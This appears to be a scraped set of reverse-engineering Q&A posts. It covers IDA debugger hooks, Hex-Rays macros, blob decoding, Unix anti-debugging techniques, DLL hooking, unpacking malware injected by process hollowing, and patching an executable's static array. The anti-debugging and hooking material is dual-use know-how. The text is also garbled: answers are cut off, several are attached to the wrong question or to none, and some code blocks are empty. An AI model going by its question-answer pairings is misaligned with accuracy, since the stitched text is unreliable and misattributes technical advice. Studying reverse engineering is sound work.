<p>For that, you'll need to install a Debugger Hooking class (any class that inherits <code>idaapi.DBG_Hooks</code>), which implements the <code>dbg_bpt(tid, ea)</code> method, which describe the thread id and linear address in which the breakpoint triggered. Returning 0 from <code>dbg_bpt</code> should prevent IDA from notifying the user it was triggered (assuming you'll handle it internally).</p>

<p>You'll have to instantiate your class and call the instance's <code>Hook</code> and <code>Unhook</code> methods for it to actually function. Please note it's better practice to install the hooks before creating the breakpoint.</p>

<h2>And finally act upon it</h2>

<p>While the debugger is running, you can call <code>idc.GetRegValue(name)</code> providing the register name to receive it's immediate value at that time.</p>

","<p>I don't think such a plugin currently exists. However, if you're willing to implement a minimal windbg backend, you could extend <a href=""http://code.google.com/p/uberstealth"" rel=""nofollow"">uberstealth</a>, which unfortunately I've never come to finish as a project (actually I think anti-debugging is a dead anyway, but that's another story ;-)).
It's essentially IDAStealth, but with all debugger specific functionality factored out (there's a backend for IDA and Olly2). All you'd have to do is write a backend for Windbg (and fix the remaining bugs, I could help you with that though), all other code is debugger independent.
Should be less than a few dozen lines of code.</p>

"Open-Source library for Complete Binary Disassembly","2442","","<p>One of the major hurdles of x86 disassembly is separating code from data. All available open-source disassembly library only perform a straight line disassembly (starts from the top and skips errors by 1 byte), compared with OllyDBG which apparently uses a control flow disassembly (using opcodes like CALL and JMP) or IDA using heuristics and emulation. However these two aren't open-source.</p>

<p>My question is, is there any open-source library or project that uses a better technique than simple straight line disassembly (control flow or heuristics based) ?</p>

"BYTE3, does it mean the third or fourth byte of an int? IDB file that's already supplied","2437","","<p>I've got a program that i'm trying to debug a little bit by trying to make sense of a function or two, there's already some info that i've downloaded via a idb file and it's helped me get somewhere. But i'm kind of stuck on a part where i've got something like this:</p>

<pre><code>BYTE3(v1) = 0;

<p>This is from the ida hex-rays plugin which has made some nice c-pseudo code for me. I can't double click the function and get it translated in some way so i don't really know how to understand what it does, my guess is that it takes either the third or fourth byte of an int. So my question is, how would i be able to find this function and look at it's disassembly at least if it can't be translated by hex-rays? The signature if that helps at all looks like this according to ida: <code>_BYTE __fastcall(int)</code></p>
","<p>All Hex-Rays macros are defined in <strong>&lt;IDA directory&gt;\plugins\defs.h</strong></p>

<p>For <code>BYTE3(x)</code>:</p>

#define BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))
...
#define BYTE3(x)   BYTEn(x,  3)

<p>So <code>BYTE3(x)</code> yields <code>(*((_BYTE*)&amp;(x)+3))</code>, which effectively means the fourth byte of the value <code>x</code>.</p>

"Decoding a blob","2405","","<p>I have a proprietary file format that is a compressed database file. This database file has a few dozen tables. Each of these tables only have a few records, many of them don't have any records at all. A few of these tables contain fields that are stored as blobs of hex data. These blobs account for 99% of the disk space of the overall database file.</p>

<p>As far as I can tell, these blobs are not compressed data (by using unix 'file' command). I have tried finding known values in these blobs by exporting values from the proprietary software, converting to hex and searching for that value in the database file. So far I haven't been able to find any matches. The problem is that the software can export in a myriad of formats and I'm not sure which one (if any) the data would be stored in.</p>

<p>Most of the tables contain checksum fields, which I believe, are responsible for my inability to edit the blobs and see what changes in the proprietary software. This combined with the fact that I cannot directly change the values that I wish to extract from the proprietary files leaves me in a difficult position.</p>

<p>Does anybody know any tricks for trying to tease out time series data from binary data?</p>

<p><strong>Edit</strong>
<a href=""http://pastelink.me/dl/4e6d0c#sthash.Co5cEOJS.dpuf"" rel=""nofollow"">This zip file</a> contains 2 hex blobs (index and value) from the decompressed database and the same data as it is exported from the program.</p>
","<p>After seeing the test files (thanks!):</p>

<p>... too easy :)</p>

<p>In <code>value.hex</code>, the first dword appears to be a total file length; the second dword the data length. The third and fourth dwords may be flags of some kind and do not appear to point to data. This lops off the first 16 bytes, hence my guess the 2nd dword is 'data length'.</p>

<p>Right after this header comes that familiar pair <code>78 9C</code> again, so I brought out my zlib decoder wrapper. Unpacking <code>value.hex</code>, starting at offset 0x10, and using <code>TINFL_FLAG_PARSE_ZLIB_HEADER</code> (as I am using <code>miniz.c</code> for eaze) gave me a correct unpacking result and a data file of 33,208 bytes long.</p>

<p>Inspecting this with 0xED shows this file consists entirely out of <em>double values</em> (8 bytes each); the first few are</p>

<pre><code>0.991932
0.991931
0.991932
0.991932
0.991932
0.991933
</code></pre>

<p>(okay, there appears to be a pattern here -- the devil is in the last few digits which 0xED doesn't show, they are not all the same values).</p>

<p>The second file, <code>index.dat</code>, also unpacks correctly and gives another long list of double values, this time clearly going up:</p>

<pre><code>0.0000
0.0082
0.0163833
0.0245667
</code></pre>

<p>I didn't cross-reference these values against the XLS file you provided, I assume you can work that out from here.</p>

<p>I only unpacked until I got a positive result back, I did not check if there are more data packets (compressed or otherwise) following the first one and you should verify using the end result of your own favourite decompression routine.</p>

<hr>

<p>Just as I was heading to bed, it struck me that the 3rd and/or 4th dwords in the header (weren't they the same anyway?) may be the 'unpacked' length.</p>

"Anti-debug techniques on Unix platforms?","2404","","<p>I am trying to scan all possible techniques to disrupt the usage of a debugger on a Unix platform (ie POSIX and a bit more).</p>

<p>I am thinking about techniques such as the <code>PTRACE</code> test at the beginning of a program (or at various points of its execution), the insertion of fake breakpoints (eg <code>int3</code>/<code>0xcc</code> x86 opcode) or time checks. But, also global strategies defined on the program to slow down the analysis of the program.</p>

<p>For now, all the techniques I found on Internet were easily worked around as soon as the anti-debug technique has been understood. So, I wonder if there are stronger ones.</p>
","<p>Here's some I've seen or heard about:</p>

<ul>
<li><p>Stripping the section headers. A simple and fully legal action that stops GDB dead in its tracks. Does not work against some other debuggers (e.g. IDA). Can be done using the <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html""><code>sstrip</code></a> tool.</p></li>
<li><p>Using <code>syscall</code> function or direct syscalls instructions instead of calling specific functions like <code>ptrace()</code>. Can be defeated by setting the breakpoint on <code>syscall</code> function or just stepping through the file, but may be non-obvious if you don't know about it.</p></li>
<li><p>Performing anti-debugging actions before <code>main()</code>, e.g. in constructors of global objects or using <code>__attribute__((constructor))</code>. Since GDB usually sets initial breakpoint in <code>main()</code>, it takes care of the default situation. Workaround is simple: put breakpoint on the actual file's entrypoint (<code>info file</code> in GDB).</p></li>
<li><p>Sending itself debugging-related signals like <code>SIGTRAP</code>. (Note that this can be ignored with <code>handle SIGTRAP nostop</code> in GDB.)</p></li>
<li><p>Forking and tracing itself with <code>ptrace</code>.</p></li>
<li><p>Fake breakpoints insertion: Inserting int3/0xcc will force the debugger to stop on these bytes as they will be treated as software breakpoints. If they are numerous it might slow down considerably the analysis.</p></li>
<li><p>Breakpoint detection: I saw this technique in this <a href=""http://www.stonedcoder.org/~kd/lib/14-61-1-PB.pdf"">paper</a>, you can attach a function that will be triggered when a breakpoint is encoutered. This paper covers also some other tricks.</p></li>

","<p>Your string seems to have an xref (cross reference, see below) from <code>0040C624</code>. This string might just be an entry in an array of error strings, with the array itself beginning just a little before <code>0040C624</code>. Your original source code may have looked like this:</p>

<p>You see that each string has a pointer entry in the <code>data</code> section, and the ascii data in the <code>rodata</code> (read only data) section. And each of the ascii strings has an xref (cross reference) to the pointer that points to it - this is not a part of the binary; ida detects where each string is referenced, and generates the ""backreferences"", or xrefs.</p>

<p>The important thing is: you can use this to find the string table (errors, at <code>0x08000034</code>) if you have only the ascii bytes. And you can find where the string table itself is used by looking at its xref - from the print_error_message function. In contrast, the unused string does <em>not</em> have an xref, because it isn't used anywhere.</p>

<p>Ida will allow you to double-click on the xref to move to where it 'comes from' to navigate easily.</p>

<p>I'd check if you have an array of strings that starts a bit before the xref to your string, where it gets used, and possibly where the using function gets called.</p>

<hr>

<p>Another possibility is something that i saw a few days ago in an ARM android shared library. The library had some strings holding function names, directly after each other, like this (translated to x86 syntax)</p>

<pre><code>errmsg    db 'Error in %s, file %s, line %d\n', 0
strtab    db 'opencachefile', 0
          db 'closecachefile', 0
          db 'getcacheentry', 0
          db 'putcacheentry', 0
          db 'delcacheentry', 0
</code></pre>

<p>The function that got something from cache used the third of these strings to log a possible error. The code looked like this (again, translated from arm to x86):</p>

<pre><code>...
mov    eax, offset strtab
add    eax, 29           ;&lt;-- difference in bytes between 'open' and 'get'
push   eax
mov    eax, offset errmsg
push   eax
call   android_log_print
</code></pre>

<p>The other functions had similar constructs, so <code>strtab</code> was referenced 5 times (one in each function), and the byte difference adjusted in each of them. I sincerely don't know why a compiler would do this, but just <em>maybe</em> something similar is going on in your code.</p>

"How to hook the entry point of a DLL?","2363","","<p>I have written a C API with support for static import hooking via overwriting the corresponding IAT entry of an exported function. It works nicely for older simple applications, but for more modern applications, it is less effective. This is primarily due to the large amount of applications nowadays that dynamically import functions. </p>

<p>My solution to this problem was to create the process in an initial suspended state and then hook the <code>LoadLibrary(Ex)(A/W)</code>  family of functions along with <code>GetProcAddress()</code> to replace the retrieved address of a target function with my own. That solution is limited in part due to the fact that it is based off the application only importing dynamic functions and libraries in the executable module, without working for processes created later ( although that could be solved by hooking <code>CreateProcess()</code> ) or more importantly, <strong>it doesn't handle the DLLs in the application that also call the target functions I want to hook</strong>. This is obviously because the DLLs have a separate import section in their own PE from the executable module. </p>

<p>Which brings me to my question, <em>how do I hook the entry point of a DLL</em>? I want to implement that method because I need the DLL to be bound to the libraries it imports statically, so I can hook  the LoadLibrary/GetProcAddress functions in before the DLL has a chance to load/import them in DLLMain. I'm assuming there is a way to do this by changing the entry point of the DLL, or by hooking a lower level function that handles calling a DLL entry point in kernel32.dll. </p>

<p>If the method I'm requesting has a better alternative, then I would gladly accept that solution as well if it achieves my desired effect.</p>

"How to start learning reverse engineering to eventually help exploiting of modern consoles like Xbox One, PS4?","2361","","<p>How can someone with little programming knowledge except for some Ruby on Rails/Ruby begin on a path of Reverse Engineering as a hobbyist to help the exploitation process of modern-day gaming consoles like Xbox Ones and PS4s?</p>

<p>I realize there is no simple ""do this, then that"" spoon-fed process of learning an extremely diverse subject matter like reversing but there are such vast amounts of tutorials that I have no idea which ones really pertain to my interest of specifically <strong><em>game console exploitation</em></strong>! I really want to help contribute to the long-term process of finding these vulnerabilities and get unsigned code running on these systems</p>
","<p>Some things you will inevitably have to know at some degree to be able to reverse engineer Game Consoles:</p>

<ul>
<li><p>Learn a lower level language such as C or C++. Most, if not all, Console games, modern and old, use these two languages for the bulk of the game (AKA, the Engine). This is important for my next point, which is:</p></li>
<li><p>Learn about the architecture of game software. Internally, games are not very different from one another. There are common data structures and algorithms that are needed by most games, and these needs reflect in the hardware. Learning the tools that engineers used to create these structures (C/C++) and knowing the structures and algorithms themselves, will help a lot when you have to make assumptions and guesses during the hacking process.</p></li>
<li><p>You'll obviously have to get familiar with hexadecimal dumps and assembly languages to be able to make sense of reversed Console code and ROMs.</p></li>
<li><p>Write a console game, preferably using an unofficial SDK. This is something that can also greatly improve your knowledge of the hardware and platform. Find out about the ""home brew"" community for your favorite Console and attempt to write a simple game using the available tools. You will have to solve a lot of hardware-specific problems and do a lot of guessing, since documentation is frequently rare. You'll gain valuable knowledge in the process.</p></li>
<li><p>Contribute to an emulator project. This is also a great way of acquiring knowledge about the hardware. The best possible way, I'd argue, since you will be trying to mimic the hardware with a piece of software.</p></li>

  <p>I have been wondering, if every program is based on machine code, can we not decompile a program until it hits machine code and make it up to real programming languages?</p>
</blockquote>

<p>This question is based on a false premise; namely that every program is based on machine code. Programs are typically written in high-level languages, which are by design architecture independent and therefore must be translated into an architecture-specific form in order to be executed:</p>

<ul>
<li><blockquote>
  <p>“High-level” programming languages take their name from the relatively
  high level, or degree of abstraction, of the features they provide, relative to those of the assembly languages they were originally designed to replace. The adjective “abstract,” in this context, refers to the degree to which language features are separated from the details of any particular computer architecture.<sup>1</sup> </p>
</blockquote></li>
<li><blockquote>
  <p>Machine independence is a fairly simple concept. Basically it says that a programming language should not rely on the features of any particular instruction set for its efficient implementation.<sup>1</sup></p>
</blockquote></li>
</ul>

<p>Programming languages are examples of formal languages:</p>

<br>
<br></li>
</ul>

<p>The translation of the series of statements written in a programming language in a program source file to semantically equivalent object code is accomplished by a compiler. Decompilation involves translation of architecture-dependent object code to a semantically equivalent representation (source code) that is not architecture specific, the reverse process of compilation.</p></li>
<li><blockquote>
  <p>How to decompile exe files with a rate of 100%? </p>
</blockquote>

<p>This does not seem to be possible.</p>

<blockquote>
  <p>Certainly, fully automated decompilation of arbitrary machine-code programs is not possible -- this problem is theoretically equivalent to the Halting Problem, an undecidable problem in Computer Science. What this means is that automatic (no expert intervention) decompilation cannot be achieved for all possible programs that are ever written. Further, even if a certain degree of success is achieved, the automatically generated program will probably lack meaningful variable and function names as these are not normally stored in an executable file (except when stored for debugging purposes).<sup><a href=""http://program-transformation.org/Transform/DecompilationPossible"" rel=""nofollow noreferrer"">2</a></sup></p>

"Ollydbg 2: Breaking after attaching to a suspended process","2351","","<p>When analyzing malware, I come across packers that inject the actual malware code into a newly spawned process and execute it that way. For that, they create a process in suspended state, inject the code and resume it using <code>ntdll.NtResumeThread</code> on Windows.</p>

<p>I would like to attach to the suspended process after the injection is done, to dump the memory and get the unpacked binary. For that, I break at <code>ntdll.NtResumeThread</code>. Using Olly 2, I can attach to the suspended process.</p>

<p>My problem is now that this seems to resume the process. That would be okay if it would break at the entry point. But it doesn't. Olly does not break until the process I attached to has terminated. Yes, I can dump the memory then. But only if it was not modified by the malware. Also, I don't want the malware code to run at all during unpacking.</p>

<p>So, is there a way to make Olly break (reliably) at the entry point of the new process?</p>

<p>Thanks in advance!</p>
","<p>FYI, the injection method to which you're referring is called <strong>dynamic forking</strong> or <strong>process hollowing</strong>.</p>

<p>When you attach to the child process with OllyDbg, OllyDbg will create a new thread for itself, but the main thread (the one that would have been resumed with <code>NtResumeThread()</code> from the parent) will still be suspended. Once you've attached with OllyDbg, you can set a breakpoint on the OEP and resume the suspended thread; this will cause OllyDbg to then break at the OEP.</p>

<p>If you aren't familiar with RTOS's, they typically are just one big kernel with no concept of user space vs kernel space or what you would think of as a normal file system, although they will contain things like images and HTML files for this device's Web interface (see <a href=""http://www.devttys0.com/2011/06/mystery-file-system/"" rel=""nofollow"">here</a> for an example of how these types of files are stored/accessed in some VxWorks systems). </p>

<p>I'd say that you already pretty much have this firmware extracted into its basic parts. To further analyze the bootloader or the two extracted LZMA files, you will need to start disassembling those files, which entails determining the memory address where they are loaded at boot time, identifying code/data sections, looking for possible symbol tables, identifying common functions, and probably writing some scripts to help with all of the above.</p>

"Decompiling/disassembling lua bytecode","2343","","<p>I've been experimenting with decompiling Lua bytecode and found useful tools like unluac, and LuaAssemblyTools. Unluac seems to do the trick with lua scripts compiled with luac giving me almost the exact source code, however when I convert lua script to bytecode using the code:</p>

<pre><code>file:write(string.dump(loadfile(filename)))
</code></pre>

<p>I get a different output than with luac, however they are very much the same being only a byte extra at (a lot of) different places. Now this new file will give me an <code>IllegalState exception</code> from unluac and when I try to run the bytecode file (created by the code line above) in luac with the -l option I get:</p>

<pre><code>C:\MyDir&gt;luac -l stringdumped.txt
luac: stringdumped.txt: bad integer in precompiled chunk
</code></pre>

<p>So there is clearly a difference between <code>string.dump</code> and luac, even though it is suggested here: <a href=""http://lua-users.org/wiki/LuaCompilerInLua"" rel=""nofollow"">http://lua-users.org/wiki/LuaCompilerInLua</a> to use <code>string.dump</code> as an emulator for luac.</p>

<p>Could anyone explain the difference to me, and suggest how I would go about reversing a <code>string.dump</code> ""compiled"" script?</p>
","<p>There is virtually no difference between the bytecode emitted by <code>loadfile</code> and <code>luac</code>.
The only possible reason for the error you are getting is that you are opening the file <em>stringdumped.txt</em> in text mode. Try the following code and see if there are any errors</p>

<pre><code>f = io.open(""stringdumped.txt"", ""wb"") --Note that file is opened in binary mode
f:write(string.dump(loadfile(""sample.lua"")))
f:close()
</code></pre>

<p>Since there is no difference, the output file <em>stringdumped.txt</em> can both be run by the lua interpreter as well as decompiled by <em>unluac</em>. The reversing steps too are exactly similar as you would do with any other compiled lua scripts.</p>

"Find the C++ STL functions in a binary","2342","","<p>I have a binary file (actually, an operating system for an ARM embedded device which also contains some high-level apps (hard coded in the user interface)).</p>

<p>I know some parts of the operating system are from C++ code, so it is likely the binary contains the C++ STL.</p>

<p>However, I don't know much about the STL.</p>

<p>Would you have a method to find the address of the STL functions?
(the basic method of searching for the ""map"", ""vector"", ... string was unsuccessful and I don't know any specific feature I could search for in this case)</p>

<p>Is there some kind of signature for the STL functions?</p>

<p>Thanks!</p>

<p>Additional informations: I use IDA. I can run the OS with a GDB. I know the address of much of the standard C functions (ctype/stddio/...).</p>
","<p>Libraries like STL or Boost are tricky. Because they're heavily template-based and most of their code is generated at compile time, it's pretty difficult to make FLIRT-style signatures for them. Too much depends on the specific compiler, build options, optimization settings and so on, so unless you match them pretty closely when generating signatures, you're unlikely to get many good hits.</p>

<p>However, you may be able to find some signs of them. For example, the typical <code>std::string</code> implementation in some cases throws exceptions <code>length_error</code> or <code>out_of_range</code>. You might be able to find references to the error text or the exception names. Other than that I think there's not much you can look for besides recognizing a specific implementation from the actual code.</p>

<p>However, since you mention it's an RTOS, I highly doubt it's using STL. In an OS, any non-deterministic behavior is a bad thing, and with STL you can get an exception basically at any time. They may use some limited C++ for better encapsulation but any high-level classes are likely to be custom-made and not from STL or Boost.</p>

<p>Here is before and after (applying my custom struct)<br>
I did the custom struct by doing a bunch of Arrays (* key), then setting proper sizes. (Guessing this isn't the proper way to make a structure in IDA PRO?)

<p>Based on these snippets, it looks like the structure in your stack variables is 8 bytes off. Can you share with us the stack variable list for that function? (Double-click on one of the local variables in the decompilation to open the stack view.)</p>

"How to deal with Static Memory Allocation while modifying an executable?","2333","","<p>I'm not new to StackExchange, but I'm quite new to reverse engineering, so please be patient with me! :P</p>

<p>At present I'm dealing with an executable that I would like to modify a little bit, for personal use; the source code of the application is not available so I can only modify it or die trying. I'm using both IDA Pro 6.1 and OllyDBG 2.0 as tools.</p>

<p>To be exact, I would just like to increase the amount of CFG_ENTRY that the application can read from <code>500</code> to <code>1000</code> in the method <code>ReadCfgFile</code> which, apparently, has a static memory region preallocated at compile-time:</p>

<p><strong>[EDIT 2 - The adventure continues! Yay!]</strong></p>

<p>After reading the answer of @Guntram Blohm, I investigated some more in order to collect and analyze the data he suggested. The first thing I did is to analyze the executable with PEiD and here is the information I got from it:</p>

<pre><code>Compiler: Microsoft Visual C++ 7.0 Method2 [Debug]
Entropy: 6.24 (Not Packed)
Linker Info: 7.10
</code></pre>

<p>When I set a breakpoint on my <code>ReadCfgFile</code> method, here is what I get from OllyDBG stack:</p>

<pre><code>CPU Stack
Address   Value      ASCII Comments
0018B2C0  [008EE644  D�.  ; RETURN to myapp.008EE644
</code></pre>

<p>And <code>008EE644</code> is a small part of the following method that, for what I can understand, looks for the configuration file and starts the routine for reading it, but without an explicit call to <code>ReadCfgFile</code> (offset highlighted):</p>

</code></pre>

<p>The, I digged a little bit more finding out the <code>CFG_DB</code> contructor, which looks like this (pseudo-code from IDA Pro):</p>

<pre><code>void __thiscall sub_8EEFC0(void *this)
{
  void *v1 = this; // esi@1

  *(_DWORD *)this = &amp;DATABASE_TABLE&lt;CFG_ENTRY_500_unsigned_int&gt;::_vftable_;

  sub_8EE500((int)this);
  sub_8EC030((char *)v1 + 502036);

  if ( *((_DWORD *)v1 + 124503) )
    operator delete__(*((void **)v1 + 124503));

  *((_DWORD *)v1 + 124503) = 0;

  unknown_libname_2673((char *)v1 + 4, 0x3E4u, 500, sub_8EEA00);
}
</code></pre>

<p>So it looks like the ""array"" of <code>CFG_ENTRY</code> is being instantiated calling a method belonging to another library linked to the executable.
Finally, I put a breakpoint at the beginning of my <code>ReadCfgFile</code> method in order to see if pointers passed to it can be of any help:</p>

<pre><code>.text:008F287A                 push esi ==&gt; esi = 00400000
[...]                          [...]
.text:008F2886                 mov esi, ecx ==&gt; ecx = myapp.0190BD08
</code></pre>

<p>And following the address <code>0190BD08</code> I just stumbled upon this:</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ? ; ; DATA XREF: sub_40FFF0:loc_410049o

</code></pre>

<p>It looks like a dead end to me...</p>
","<p>It seems to me that the problem is a bit worse than you describe, and there's no easy way to get around it.</p>

<p>First, @sealed seems to be right with the function being a class method, and your compiler passing the class pointer in <code>ecx</code>, because that's the only way for</p>

<pre><code>.text:008F28B5                 lea     ecx, [esi+eax*4+4]
.text:008F28B9                 call    ReadCfgEntry
</code></pre>

<p>to make sense - other parameters are pushed on the stack, and the values of eax, edx and ebx seem not to be very meaningful, so the compiler doesn't use some kind of parameters-in-registers fastcall abi.</p>

<p>Now, let me reorder the statements from the loop start to the call a bit (without changing the meaning, just to make a bit clearer what happens). The compiler spread the ""increment the count by one"" instructions between the others, probably to take advantage of pipelining within the processor:</p>

<pre><code>-- get the current ""number of config entries"" count, and abort the loop if it exceeds 500

.text:008F2890                 mov     eax, [esi+79954h]
.text:008F2896                 cmp     eax, 1F4h
.text:008F289B                 jge     loc_8F29DF

-- increment the count by one

.text:008F28A6                 lea     ecx, [eax+1]
.text:008F28AE                 mov     [esi+79954h], ecx

-- eax = (( count &lt;&lt; 5 - count ) * 8 ) + count = count*249
.text:008F28A1                 mov     edx, eax
.text:008F28A3                 shl     edx, 5
.text:008F28A9                 sub     edx, eax
.text:008F28AB                 lea     eax, [eax+edx*8]

-- push edi, which is a parameter to this function, on the stack;
-- pass this = esi+4*eax+4  == esi+996*count+4 in ecx. Remember esi was set to
-- `this`=`ecx` at the start of the current method and hasn't been changed.

.text:008F28B4                 push    edi
.text:008F28B5                 lea     ecx, [esi+eax*4+4]
.text:008F28B9                 call    ReadCfgEntry
</code></pre>

<p>This seems like ReadCfgEntry is a class method as well, which gets its <code>this</code> pointer in cx. From the way the array index is calculated, i'd assume the original C++ class looked like this:</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    ....
}
</code></pre>

<p>with ConfigurationEntry being a 996 byte class.
Now, the bad news is: These two class members need 4+(500*996) bytes. This is equal to 498004, or 0x79954. So your entry count is directly behind the entries at 0x79954, with another variable at 0x79958:</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    int entryCount;
    int somethingelse;
    ... ??? ...
}
</code></pre>

<p>Now, if the entries had been a pointer and allocated with <code>new</code>, it would have been easier to just modify the size parameter in that new from 500 to 1000. But in your case, you'd have to modify the new method of the Configuration class, and you'd have to modify ALL references to variables ""behind"" the configuration entries as well. You already mentioned that for the count variable at offset 0x79954, and the next variable at offset 0x79958, but there might be more of them that don't get referenced in your reader function, so you'll have a hard time finding them all.</p>

<hr>

<p>I was just about to post this, when i saw your edit to the question.</p>

<p>As you realized in your edit, you need to change all accesses to structure components behind the array of entries that you want to increase. You need to do this in your class methods (which you can find easily as you have the vtables), but also in the rest of your program (as you don't know which of the original class variables where public and might be accessed from outside the class itself). <em>Unfortunately, you can't really automate that, because, for every occurence of, say 0x79954, you'd have to check if it's an index into your class, or something else.</em></p>

<p>Since i don't know which compiler was used to write your program, i can't tell much about how it stores the function vtable. With a bit of luck, the first entry (the one i called <code>whatever</code> earlier) is the vtable pointer. You can check this if you run the program with a debugger, and check if the <code>whatever</code> variable points to the vtable when it reaches the ReadConfigFile method. If it does, this is good, because we don't have to care about overwriting the vtable when extending the structure.</p>

<p>Then, there must be some allocator function for your classes. Since you seem to have a class called DATABASE_TABLE, and a derived one called CFG_DB, the second one is probably larger. Try finding the initializing method of this second, larger class. It should call <code>new</code> or a similar memory-allocator, with a size that fits the structure size (so it's probably somewhere between 79960h and 79a00h), and it should move the vtable pointer into the newly allocated memory, so you might be able to find it checking for cross-references of the vtable. Or, use a debugger and set a breakpoint on ReadConfigFile and check the stack for what called it, chances should be good you find a function that allocates the class instance first, then calls its ReadConfigFile member function.</p>

<p>After you find where the class is instantiated, i'd probably try not to increase the array size from 500 to 1000, but, instead, just allocate a larger array behind the structure. For example, if your current function allocates 79a00h bytes, add the 996000d bytes to it that 1000 entries need, resulting in 16cca0h bytes. Then, change the</p>

<pre><code>lea ecx, [esi+eax*4+4]
</code></pre>

<p>in front of ReadCfgEntry to</p>

<pre><code>lea ecx, [esi+eax*4+16cca0h]
</code></pre>

<p>That way, you've created another array <em>behind</em> the current structure instead of extending the current one. <em>Which means none of your structure offsets, except the config items themselves, have changed</em>.</p>

<p>Speaking in C++, we just changed the class to</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    int entryCount;
    int somethingelse;
    ... ??? ...
    ConfigurationEntry newEntries[1000];
}
</code></pre>

<p>and in the next step we have to re-write all accessed to <code>entries</code> to use <code>newentries</code>.</p>

<p>Check your member functions for accesses to the original array, and replace them as well. The most simple way to do this is probably</p>

<ul>
<li>start the program with a debugger</li>
<li>set a breakpoint on the function you identified previously that allocates the structure</li>
<li>after the structure is allocated, set a hardware breakpoint on (structure address + 4)</li>
<li>continue the program, and whenever you hit the hardware breakpoints, you found a match</li>
</ul>

<p>Since the hardware breakpoint is on entries[0], chances are good that every access to an entry hits the 0-th of it at some point.</p>

<p>Also, since ReadCfgEntry is probably a class method, chances are good that there is a loop somewhere that just allocates one class instance for each entry - something like</p>

<pre><code>for (i=0; i&lt;500; i++) {
    entries[i]=new ConfigurationEntry()
}
</code></pre>

<p>Your hardware breakpoint should catch this loop quite quickly. Patch the executable to change the 500 to 1000, and the entries[i] calculation to your new array. After that, your new array will get initialized, but the old one will hold nothing but NULL pointers. Which means, you might get invalid memory acceses through those NULL pointers in the future, which help identifying accessed to your original array (that you can patch) as well.</p>

<hr>

<h2>Edit - Edit after reading OP's 2nd answer</h2>

<p>Dead end? Not at all, you gathered and posted very valuable information.</p>

<p>First, your pseudo code of the CFG_DB constructor</p>

<pre><code>void __thiscall sub_8EEFC0(void *this)
{
  void *v1 = this; // esi@1
  *(_DWORD *)this = &amp;DATABASE_TABLE&lt;CFG_ENTRY_500_unsigned_int&gt;::_vftable_;
</code></pre>

<p>confirms that the 4 bytes at the beginning of the class structure are actually a pointer to the virtual function table of the class.</p>

<p>Second, your snippet</p>

<pre><code>.text:008EE639                 push    ebp
.text:008EE63A                 lea     ecx, [esp+50h+var_2C]
.text:008EE63E                 push    ecx
.text:008EE63F                 mov     ecx, ebx
.text:008EE637                 mov     eax, [ebx]
.text:008EE641                 call    dword ptr [eax+14h]
.text:008EE644 ;     ---------------------------------------------------------------------------         
.text:008EE644                 test    al, al ; HERE IS THE STACK REFERENCE
</code></pre>

<p>fits very well. (Again, i reordered the assembly instructions in a way that doesn't change what they do, but makes it clearer to understand them). Remember your vtable that had a function offset, a nullsub, 3 more function offsets, and <code>ReadCfgFile</code> as its entries? Since each of these has 4 bytes, the offset of the ReadCfgFile function pointer in the vtable is 20, or 14h. In that code snippet, ebx is a class pointer; <code>mov eax, [ebx]</code> gets the vtable pointer from the class pointer, and <code>call dword ptr [eax+14h]</code> calls the function at that offset, namely <code>ReadCfgFile</code>. Before that, it initializes the <code>this</code> register (ecx) to ebx, and pushes 2 parameters on the stack. This seems to be a very standard call to a class method.</p>

<p>Next, your constructor ends in</p>

<pre><code>unknown_libname_2673((char *)v1 + 4, 0x3E4u, 500, sub_8EEA00);
</code></pre>

<p>with the first parameter (v1+4) being the address of the ConfigurationEntries array within the Configuration class (i'm keeping my old invented variable/class names), the second parameter (0x3e4 == 996) the size of each array entry; the third (500) the number of entries, and a callback function. I'm almost sure this is the constructor function for the individual ConfigurationEntries. Which means this is the function i said you need to find, and which should be changed to</p>

<pre><code>unknown_libname_2673((char *)v1 + XXXXX, 0x3E4u, 1000, sub_8EEA00);
</code></pre>

<p>with XXXXX being the offset of the newEntries array once we allocate space for it.</p>

<p>Next, reconsidering a part of the code snippet before the indirect call to ReadConfigFile,</p>

<pre><code>.text:008EE62A                 mov     edx, [ebx]
.text:008EE62C                 mov     ecx, ebx
.text:008EE62E                 mov     [ebx+7A938h], ebp
.text:008EE634                 call    dword ptr [edx+4]
</code></pre>

<p>we see that there is a move to <code>ebx+7A938h</code>, with ebx being the class pointer, so there seems to be another class member at this offset. This is quite a lot of memory <em>after</em> the offset of the element count (79954h) - so the structure has a lot more components. Good thing you're not trying to shift them all. The constructor function, which accesses <code>this+502036</code>, or <code>this+0x7a914</code>, would have been another hint at that. (It also accesses <code>this+124503</code>, but with <code>this</code> being a dword pointer, this means 498012 bytes, which is still less than 502036).</p>

<p>Next, you found out the address 0190BD08, which is a very good thing. Along with the XREFs, and the data definition,</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ? 
</code></pre>

<p>this means:</p>

<p>The class structure at that address is NOT allocated dynamically, and it is NOT initialized to anything, instead, it is an uninitialized global variable. In C++, it would have probably been a</p>

<pre><code>static Configuration myConfig;
</code></pre>

<p>with all the xrefs you're seeing being a reference to myConfig. As the assembly instructions at those places are</p>

<pre><code>mov     ecx, offset unk_190BD08
</code></pre>

<p>i'm almost sure the calls to a class member function are one or 2 instructions after each of these. Congractulations, you've just found a way to catch many of the instances where the configuration gets accessed. To verify this, unk_190BD08 being a global variable for the configuration, you could run the program with a breakpoint on the constructor function (sub_8EEFC0), i bet it's called only once, and 190BD08 is the parameter to it.</p>

<p>The bad thing about the configuration class instance being a static variable, not a new()-instantiated one, is that we can't just increase the size in the new() call. Instead, we'll have to move it to a part of the address space where it doesn't disturb anything else - at the end of the current uninitialized data segment. Find the very last entry in your data segment, then choose a nice address behind that, and rewrite all the xrefs to unk_190BD08 to that new address. Then, run the program using ollydbg, place a hardware breakpoint on 190BD08 just in case, and check that the functions you know to be class member functions, and the initialized, all get the new address instead of 190BD08 as their <code>ecx</code> (this) parameter. When you've finished, you're ready to implement the 2nd part, change the accesses to <code>this+4</code> to <code>this+XXXX</code> with <code>XXXX</code> being the class size.</p>

